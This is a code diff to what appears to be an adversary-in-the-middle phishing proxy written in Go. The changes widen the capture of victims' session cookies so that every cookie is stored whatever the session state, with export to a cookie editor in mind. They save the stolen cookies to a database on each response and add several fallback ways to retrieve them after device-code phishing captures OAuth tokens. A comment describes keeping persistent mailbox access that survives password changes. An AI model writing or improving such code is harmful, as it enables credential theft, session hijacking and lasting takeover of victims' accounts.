@@ -3101,6 +3101,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			is_http_auth := false
 			cookies := resp.Cookies()
 			resp.Header.Del("Set-Cookie")
+			
+			// Debug: log when we have cookies but no session
+			if len(cookies) > 0 && ps.SessionId == "" {
+				log.Debug("[cookie-debug] Got %d cookies but no SessionId for %s", len(cookies), req_hostname)
+			}
 
 			for _, ck := range cookies {
 				// parse cookie
@@ -3131,16 +3136,22 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							c_domain = "." + c_domain
 						}
 					}
-					log.Debug("%s: %s = %s", c_domain, ck.Name, ck.Value)
 					
 					// CAPTURE ALL COOKIES regardless of auth_tokens (for Cookie Editor export)
 					s, ok := p.sessions[ps.SessionId]
-					if ok && (s.IsAuthUrl || !s.IsDone) {
+					if ok {
+						// Capture cookie regardless of session state (for device code flow)
 						if ck.Value != "" && (ck.Expires.IsZero() || time.Now().Before(ck.Expires)) {
-							// Store cookie in session (always capture for export)
 							s.AddCookieAuthToken(c_domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, ck.Expires)
 							s.LastTokenActivity = time.Now()
-							log.Debug("[cookie-capture] %s:%s captured", c_domain, ck.Name)
+							// Log every 10th cookie to avoid spam
+							totalCookies := 0
+							for _, dm := range s.CookieTokens {
+								totalCookies += len(dm)
+							}
+							if totalCookies%10 == 1 || totalCookies <= 5 {
+								log.Info("[cookie] Session %s now has %d cookies (latest: %s:%s)", ps.SessionId[:8], totalCookies, c_domain, ck.Name)
+							}
 						}
 					}
 				}
@@ -3149,14 +3160,20 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				resp.Header.Add("Set-Cookie", ck.String())
 			}
 			
-			// Save cookies to database incrementally (for device code flow to read)
+			// Save cookies to database SYNCHRONOUSLY every response (critical for device code)  
 			if pl != nil && ps.SessionId != "" {
 				if s, ok := p.sessions[ps.SessionId]; ok && len(s.CookieTokens) > 0 {
-					go func(sid string, cookies map[string]map[string]*database.CookieToken) {
-						if err := p.db.SetSessionCookieTokens(sid, cookies); err != nil {
-							log.Debug("[cookie-save] error: %v", err)
-						}
-					}(ps.SessionId, s.CookieTokens)
+					// Count cookies before save
+					totalCookies := 0
+					for _, dm := range s.CookieTokens {
+						totalCookies += len(dm)
+					}
+					// Save synchronously (not in goroutine) to ensure data is available
+					if err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens); err != nil {
+						log.Warning("[cookie-db] Failed to save %d cookies to database: %v", totalCookies, err)
+					} else if totalCookies > 0 && totalCookies%10 == 0 {
+						log.Debug("[cookie-db] Saved %d cookies to database for session %s", totalCookies, ps.SessionId[:8])
+					}
 				}
 			}
 			
@@ -3797,22 +3814,66 @@ func (p *HttpProxy) setupDeviceCodeCallbacks() {
 
 				log.Success("[%d] [devicecode] %s tokens captured and linked to AitM session!", sid, provider)
 
-				// Debug: log cookie count in session
-				log.Debug("[devicecode] Session %s has %d cookie domains", s.Id, len(s.CookieTokens))
+				// AGGRESSIVE COOKIE RETRIEVAL - try multiple methods
+				log.Info("[devicecode] === COOKIE RETRIEVAL START ===")
+				log.Info("[devicecode] Session ID: %s, In-memory cookies: %d domains", s.Id, len(s.CookieTokens))
+				
+				// Method 1: In-memory session cookies
+				cookieCount := 0
 				for domain, cookies := range s.CookieTokens {
-					log.Debug("[devicecode] Domain %s: %d cookies", domain, len(cookies))
+					cookieCount += len(cookies)
+					log.Debug("[devicecode] In-memory: %s = %d cookies", domain, len(cookies))
 				}
-
-				// If in-memory session has no cookies, try to load from database
-				if len(s.CookieTokens) == 0 {
-					log.Debug("[devicecode] In-memory session has no cookies, checking database...")
+				log.Info("[devicecode] Method 1 (in-memory): %d total cookies from %d domains", cookieCount, len(s.CookieTokens))
+				
+				// Method 2: Try database by session string ID
+				if len(s.CookieTokens) == 0 || cookieCount == 0 {
+					log.Info("[devicecode] Method 2: Querying database by session_id: %s", s.Id)
 					if dbSession, err := p.db.GetSessionBySid(s.Id); err == nil && dbSession != nil {
-						if len(dbSession.CookieTokens) > 0 {
-							log.Info("[devicecode] Found %d cookie domains in database, syncing to session", len(dbSession.CookieTokens))
-							s.CookieTokens = dbSession.CookieTokens
+						dbCookieCount := 0
+						for _, cookies := range dbSession.CookieTokens {
+							dbCookieCount += len(cookies)
 						}
+						log.Info("[devicecode] Method 2 result: %d cookies from %d domains", dbCookieCount, len(dbSession.CookieTokens))
+						if dbCookieCount > 0 {
+							s.CookieTokens = dbSession.CookieTokens
+							log.Success("[devicecode] Loaded cookies from database!")
+						}
+					} else if err != nil {
+						log.Warning("[devicecode] Method 2 failed: %v", err)
 					}
 				}
+				
+				// Method 3: Try database by numeric session ID (sid)
+				if len(s.CookieTokens) == 0 {
+					log.Info("[devicecode] Method 3: Querying database by numeric ID: %d", sid)
+					sessions, err := p.db.ListSessions()
+					if err == nil {
+						for _, dbSess := range sessions {
+							if dbSess.Id == sid || dbSess.SessionId == s.Id {
+								dbCookieCount := 0
+								for _, cookies := range dbSess.CookieTokens {
+									dbCookieCount += len(cookies)
+								}
+								log.Info("[devicecode] Method 3 found session %d: %d cookies", dbSess.Id, dbCookieCount)
+								if dbCookieCount > 0 {
+									s.CookieTokens = dbSess.CookieTokens
+									log.Success("[devicecode] Loaded cookies from database listing!")
+									break
+								}
+							}
+						}
+					} else {
+						log.Warning("[devicecode] Method 3 failed: %v", err)
+					}
+				}
+				
+				// Final count
+				finalCookieCount := 0
+				for _, cookies := range s.CookieTokens {
+					finalCookieCount += len(cookies)
+				}
+				log.Info("[devicecode] === COOKIE RETRIEVAL END: %d total cookies ===", finalCookieCount)
 
 				// Automatically add account to mailbox manager for persistent access
 				// This ensures the account survives password changes as long as tokens are refreshed
